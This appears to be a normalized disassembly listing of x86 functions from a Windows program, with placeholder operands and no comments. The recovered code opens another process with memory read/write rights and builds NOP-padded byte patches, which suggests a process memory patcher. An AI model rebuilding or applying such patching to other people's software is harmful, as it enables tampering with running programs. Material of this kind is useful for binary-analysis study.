and esp 0xfffffff8
push 0xffffffff
push sub_45424b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor edi edi
mov [ esp + 0x10 ] 0x0
cmp eax 0x1
jne r-xdata
push 0x0
push edi
call sub_42bd50
add esp 0x8
mov al 0x1
mov ecx [ esp + 0xc0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x14 ]
push edx
call sub_406af0
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0xd0 ] edi
call sub_41b8f0
lea ecx [ esp + 0x14 ]
lea edi [ esp + 0x10 ]
mov [ esp + 0xc8 ] 0xffffffff
call sub_403550
sub_42ba30
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_454203
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xd0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe8 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
xor eax eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0xd8 ] 0x7
mov [ esp + 0xd4 ] ebx
mov [ esp + 0xc4 ] ax
mov [ esp + 0xf0 ] ebx
mov ecx [ edi ]
mov esi [ edi + 0x4 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x10 ] ebx
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push ebx
push ecx
or eax 0xffffffff
lea edi [ esp + 0xcc ]
call sub_401be0
mov esi ebx
jmp r-xdata
mov al 0x1
mov ecx [ esp + 0xe8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xd0 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x1c ]
push edx
call sub_406af0
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0xf8 ] 0x1
call sub_41b8f0
mov eax [ edi + 0x4 ]
add eax 0xffffffe4
push ebx
push eax
or eax 0xffffffff
lea edi [ esp + 0xcc ]
lea esi [ esp + 0x1c ]
call sub_401be0
lea ecx [ esp + 0x1c ]
mov [ esp + 0xf0 ] bl
call sub_403550
cmp [ esp + 0xd4 ] ebx
je r-xdata
mov edi 0x8
mov eax [ esp + 0xc4 ]
mov edi 0x8
cmp [ esp + 0xd8 ] edi
jae r-xdata
mov edx [ esp + 0xc4 ]
push edx
call sub_43811c
add esp 0x4
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xc4 ]
mov eax [ esp + 0xc4 ]
cmp [ esp + 0xd8 ] edi
jae r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
mov [ esp + 0x18 ] ebx
call sub_42bd50
add esp 0x8
jmp r-xdata
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xc4 ]
cmp [ esp + 0xd8 ] edi
jb r-xdata
mov eax [ esp + 0xc4 ]
cmp [ esp + 0xd8 ] edi
jae r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
mov [ esp + 0x18 ] 0x1
call sub_42bd50
add esp 0x8
jmp r-xdata
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xc4 ]
mov eax [ esp + 0xc4 ]
cmp [ esp + 0xd8 ] edi
jae r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
mov [ esp + 0x18 ] 0x2
call sub_42bd50
add esp 0x8
jmp r-xdata
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xc4 ]
mov eax [ esp + 0xc4 ]
cmp [ esp + 0xd8 ] edi
jae r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
mov [ esp + 0x18 ] 0x3
call sub_42bd50
add esp 0x8
jmp r-xdata
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xc4 ]
lea eax [ esp + 0xc4 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
mov [ esp + 0x18 ] 0x4
call sub_42bd50
add esp 0x8
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
sub_42bd50
push ebp
mov ebp esp
push 0xffffffff
push sub_4541b9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x13c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x129 ] 0x0
mov [ ebp - 0x140 ] edi
mov [ ebp - 0x13c ] edi
mov [ ebp - 0x138 ] edi
lea eax [ ebp - 0x140 ]
mov [ ebp - 0x4 ] edi
call sub_418d50
mov eax [ ebp - 0x13c ]
cmp eax edi
je r-xdata
add eax 0x4
lea ecx [ ebp - 0x18 ]
cmp ecx eax
mov ecx [ ebp - 0x140 ]
mov [ ebp - 0x13c ] eax
mov [ ebp - 0x18 ] 0x5
jae r-xdata
mov [ eax ] 0x4
cmp eax [ ebp - 0x138 ]
jne r-xdata
lea edx [ ebp - 0x18 ]
cmp ecx edx
ja r-xdata
cmp eax edi
je r-xdata
lea eax [ ebp - 0x140 ]
call sub_418d50
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x140 ]
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebp - 0x138 ]
jne r-xdata
add eax 0x4
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x13c ] eax
mov [ ebp - 0x18 ] 0x2
cmp edx eax
jae r-xdata
mov [ eax ] 0x5
cmp eax edi
je r-xdata
lea eax [ ebp - 0x140 ]
call sub_418d50
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x140 ]
cmp eax [ ebp - 0x138 ]
jne r-xdata
cmp ecx edx
ja r-xdata
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
cmp eax edi
je r-xdata
lea eax [ ebp - 0x140 ]
call sub_418d50
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x140 ]
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebp - 0x138 ]
jne r-xdata
add eax 0x4
lea edx [ ebp - 0x18 ]
mov ebx 0x3
mov [ ebp - 0x13c ] eax
mov [ ebp - 0x18 ] ebx
cmp edx eax
jae r-xdata
mov [ eax ] 0x2
cmp eax edi
je r-xdata
lea eax [ ebp - 0x140 ]
call sub_418d50
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x140 ]
cmp eax [ ebp - 0x138 ]
jne r-xdata
cmp ecx edx
ja r-xdata
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
cmp eax edi
je r-xdata
lea eax [ ebp - 0x140 ]
call sub_418d50
mov eax [ ebp - 0x13c ]
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebp - 0x138 ]
jne r-xdata
add eax 0x4
mov [ ebp - 0x13c ] eax
lea eax [ ebp - 0x140 ]
call sub_408070
test al al
je r-xdata
mov [ eax ] ebx
cmp eax edi
je r-xdata
lea eax [ ebp - 0x140 ]
call sub_418d50
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x140 ]
mov eax [ ebp - 0x140 ]
test eax eax
je r-xdata
mov edi 0x7
xor esi esi
xor edx edx
xor eax eax
mov [ ebp - 0x18 ] 0x5320478d
mov [ ebp - 0x14 ] 0xff50
mov [ ebp - 0x12 ] 0x15
mov [ ebp - 0xbc ] edi
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xd0 ] dx
mov [ ebp - 0xa0 ] edi
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xb4 ] ax
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x6c ] cx
push 0xb
mov eax r--data
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x5c ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x2
xor edx edx
push 0xb
mov eax r--data
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x50 ] dx
call sub_401c90
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0xd0 ]
push ecx
mov [ ebp - 0x4 ] bl
call sub_40d910
add esp 0x8
test al al
je r-xdata
mov ecx [ ecx + esi * 4 ]
mov [ eax ] ecx
jmp r-xdata
mov al [ ebp - 0x129 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
push eax
call sub_43811c
add esp 0x4
push 0x0
lea eax [ ebp - 0x34 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0xb
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
xor edx edx
xor eax eax
mov [ ebp - 0xf4 ] edi
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0x108 ] dx
mov [ ebp - 0xd8 ] edi
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xec ] ax
lea ecx [ ebp - 0x7c ]
push ecx
lea edx [ ebp - 0x50 ]
push edx
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_40b420
add esp 0xc
lea ebx [ edi + 0x1 ]
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea edx [ ebp - 0x34 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0xa
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ ebp - 0x7c ]
mov esi [ ebp - 0x114 ]
mov edi [ ebp - 0x110 ]
push ecx
push 0x0
push 0x38
call [ OpenProcess@IAT ]
mov ebx eax
mov [ ebp - 0x148 ] ebx
test ebx ebx
je r-xdata
mov ebx 0x8
cmp [ ebp - 0x20 ] ebx
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea edx [ ebp - 0x34 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x9
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push ebx
lea edx [ ebp - 0x130 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
add edi esi
push edi
push esi
mov edi 0x7
mov [ ebp - 0x130 ] 0x0
call sub_406610
add esp 0x14
test al al
je r-xdata
cmp [ ebp - 0x3c ] ebx
jb r-xdata
mov edx [ ebp - 0x34 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
cmp [ ebp - 0x20 ] ebx
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea eax [ ebp - 0x34 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x8
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ ebp - 0x130 ]
add edx 0xfffffffa
mov eax ebx
lea esi [ edi - 0x3 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] 0x0
call sub_406510
test al al
je r-xdata
xor esi esi
xor ecx ecx
mov edi 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x50 ] cx
cmp [ ebp - 0x58 ] ebx
jb r-xdata
mov eax [ ebp - 0x50 ]
push eax
call sub_43811c
add esp 0x4
lea esi [ ebp - 0x128 ]
call sub_407c10
jmp r-xdata
mov edx [ ebp - 0x34 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ ebp - 0x34 ]
call sub_4218d0
lea esi [ ebp - 0x128 ]
mov ebx 0x8
call sub_407c10
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea edx [ ebp - 0x34 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x7
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x130 ] edx
xor eax eax
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x6c ] ax
cmp [ ebp - 0xa0 ] ebx
jb r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ ebp - 0x34 ]
call sub_4218d0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx [ ebp - 0x130 ]
cmp edx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp - 0x130 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
xor edx edx
mov [ ebp - 0xa0 ] edi
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xb4 ] dx
cmp [ ebp - 0xbc ] ebx
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax ebx
mov esi 0x4
lea ecx [ ebp - 0x130 ]
call sub_406510
test al al
je r-xdata
push ebx
call [ CloseHandle@IAT ]
lea esi [ ebp - 0x128 ]
mov ebx 0x8
call sub_407c10
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
lea esi [ ebp - 0x128 ]
mov ebx 0x8
call sub_407c10
jmp r-xdata
push 0x2488
call sub_438178
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax [ ebp - 0xd0 ]
push eax
call sub_43811c
add esp 0x4
xor ebx ebx
push 0x2488
push 0x0
push esi
call sub_43a820
add esp 0xc
mov ebx esi
jmp r-xdata
push ebx
call sub_43811c
mov ebx [ ebp - 0x148 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x148 ]
mov edx [ ebp - 0x130 ]
mov esi 0x2488
mov ecx ebx
call sub_406510
mov [ ebp - 0x129 ] al
test al al
je r-xdata
mov eax [ ebp - 0x130 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_420bb0
mov esi eax
call sub_408150
mov ecx [ ebx ]
mov edx [ ebx + 0x4 ]
push ecx
push ecx
push r--data
push ecx
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_409de0
add esp 0xc
push eax
call sub_420bb0
mov esi eax
call sub_408150
mov eax [ ebx + 0x1c ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
call sub_408150
lea ecx [ ebx + 0x20 ]
push ecx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea edx [ ebx + 0x1d6c ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea eax [ ebx + 0x1dae ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
mov ecx [ ebx + 0x2484 ]
lea esi [ ebp - 0x34 ]
call sub_42cb10
push r--data
push ecx
push eax
push ecx
push r--data
push ecx
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebx + 0x2484 ]
push ecx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x4
call sub_4218d0
cmp [ ebp - 0x144 ] 0x0
je r-xdata
mov edx [ ebx + 0x1c ]
cmp edx [ eax ]
jne r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov edx [ ebp - 0x144 ]
mov edi [ ebp - 0x130 ]
mov eax [ ebp - 0x148 ]
push edx
add edi 0x2484
mov esi 0x4
call sub_406560
add esp 0x4
mov [ ebp - 0x129 ] al
mov edi r--data
test al al
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
lea esi [ ebp - 0x34 ]
call sub_42cb10
push edi
push ecx
push r--data
push ecx
push eax
push ecx
push r--data
push ecx
mov ecx [ ebp - 0x144 ]
mov [ ebp - 0x4 ] 0x6
mov edx [ ecx ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x4
call sub_4218d0
mov edi r--data
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_42c790
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452ca3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1a0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1b8 ]
mov [ fs : 0x0 ] eax
mov al 0x90
push 0x11c
xor ebx ebx
mov [ esp + 0x1b0 ] al
lea eax [ esp + 0x28 ]
push ebx
push eax
mov [ esp + 0x24 ] 0x7f02f883
mov [ esp + 0x20 ] 0x9090
mov [ esp + 0x17c ] 0x324918b
mov [ esp + 0x180 ] 0xc0330000
mov [ esp + 0x184 ] 0x320913b
mov [ esp + 0x188 ] 0xf5e0000
mov [ esp + 0x18c ] 0x84
mov [ esp + 0x1a4 ] 0x32081c7
mov [ esp + 0x1a8 ] 0xffff0000
mov [ esp + 0x1ac ] 0xc0337fff
mov [ esp + 0x1b0 ] 0x9090905e
mov [ esp + 0x1b4 ] 0x90909090
mov [ esp + 0x16c ] 0x324868b
mov [ esp + 0x170 ] 0x863b0000
mov [ esp + 0x174 ] 0x320
mov [ esp + 0x178 ] 0x840f
mov [ esp + 0x190 ] 0x32086c7
mov [ esp + 0x194 ] 0xffff0000
mov [ esp + 0x198 ] 0x90907fff
mov [ esp + 0x19c ] 0x90909090
mov [ esp + 0x1a0 ] 0x9090
call sub_43a820
add esp 0xc
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
push ebx
lea edx [ esp + 0x148 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x1d0 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esp + 0x28 ]
cmp ecx 0x5
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x2c ]
cmp ecx 0x6
jne r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ ebx + 0x4 ]
lea edx [ esp + 0x14 ]
lea esi [ ebx + 0x2 ]
lea edi [ ebx + 0x3 ]
jmp r-xdata
cmp [ esp + 0x158 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push eax
push ecx
push 0x2e
push ecx
push ecx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp eax ebx
jne r-xdata
push edi
push esi
push edx
push ecx
push eax
sub esp 0x1c
mov ecx esp
mov [ esp + 0x4c ] esp
mov esi 0x7
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push 0xb
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ esp + 0x20c ] ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x6c ] esp
mov [ ecx ] ax
push 0xb
mov eax r--data
call sub_401c90
mov [ esp + 0x20c ] 0xffffffff
call sub_407430
add esp 0x4c
jmp r-xdata
mov al 0x1
mov ecx [ esp + 0x1b8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1a0 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x144 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx 0x11
lea eax [ esp + 0x170 ]
lea edx [ esp + 0x198 ]
lea esi [ ecx + 0x4 ]
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
lea eax [ esp + 0x160 ]
mov ecx 0xe
lea edx [ esp + 0x184 ]
mov esi 0x12
xor edi edi
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_42cb10
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx 0x4
ja r-xdata
mov [ esi + 0x10 ] eax
push 0x1
mov eax r--data
jmp [ ecx * 4 + jump_table_42cbe4 ]
mov [ esi + 0x10 ] eax
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
push 0x7
mov eax r--data
mov ecx esi
call sub_401c90
mov eax esi
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] cx
push 0x17
mov eax r--data
mov ecx esi
call sub_401c90
mov eax esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x10 ] eax
push 0xe
mov eax r--data
jmp r-xdata
mov [ esi + 0x10 ] eax
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
push 0x13
mov eax r--data
mov ecx esi
call sub_401c90
mov eax esi
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] cx
push 0xa
mov eax r--data
mov ecx esi
call sub_401c90
mov eax esi
mov esp ebp
pop ebp
retn
xor edx edx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi ] dx
call sub_401c90
mov eax esi
mov esp ebp
pop ebp
retn
sub_42cc00
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax 0x9
ja r-xdata
xor eax eax
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
push 0x1
mov eax r--data
mov ecx esi
call sub_401c90
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_42ccec ]
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax r--data
call sub_401980
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_42cd20
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push ecx
call sub_410cb0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
pop edi
sub_42cd60
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ebx
mov ebx [ esi + 0x4 ]
push ecx
call sub_410cf0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
